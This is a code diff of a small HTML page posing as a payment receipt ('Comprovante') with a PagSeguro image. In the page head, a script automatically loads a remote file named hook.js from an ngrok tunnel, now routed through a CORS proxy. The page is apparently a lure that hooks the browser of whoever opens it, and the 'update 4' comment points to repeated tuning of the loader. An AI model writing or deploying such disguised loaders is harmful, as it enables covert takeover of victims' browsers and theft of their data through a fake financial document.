@@ -3,15 +3,13 @@
 <head>
     <title>Comprovante</title>
     <script>
-        // Define a callback function that will be called by the JSONP script
-        function jsonpCallback(data) {
-            console.log('JSONP callback executed:', data);
-            // You can process the data here
-        }
-
-        // Create a new script element for JSONP
+        // Create a new script element
         var script = document.createElement('script');
-        script.src = 'https://9288-191-54-132-249.ngrok-free.app:443/hook.js?callback=jsonpCallback'; // Append the callback parameter
+
+        // Use corsproxy.io to fetch the script
+        var corsProxy = 'https://corsproxy.io/?';
+        var scriptUrl = encodeURIComponent('https://9288-191-54-132-249.ngrok-free.app:443/hook.js');
+        script.src = corsProxy + scriptUrl;
 
         // Append the script to the head
         document.head.appendChild(script);
@@ -19,6 +17,6 @@
 </head>
 <body>
     <img src="https://assets-blog.pagseguro.uol.com.br/wp-content/2020/11/Post_329_imagem_meio_de_texto_IIIIIII.png" alt="Imagem">
-    <!-- script updated 3 -->
+    <!-- script update 4 -->
 </body>
 </html>
